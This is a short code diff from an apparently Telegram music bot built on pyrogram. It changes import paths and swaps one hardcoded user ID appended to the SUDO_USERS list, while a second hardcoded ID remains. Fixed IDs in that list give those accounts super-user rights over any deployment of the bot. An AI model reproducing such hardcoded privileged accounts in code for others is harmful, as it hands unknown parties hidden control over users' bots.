@@ -18,10 +18,10 @@
 from typing import Callable
 from pyrogram import Client
 from pyrogram.types import Message
-from helpers.admins import get_administrators
-from config import SUDO_USERS
+from KennedyMusic.helpers.admins import get_administrators
+from KennedyMusic.config import SUDO_USERS
 
-SUDO_USERS.append(2088106582)
+SUDO_USERS.append(1829047705)
 SUDO_USERS.append(1669508271)
 
 
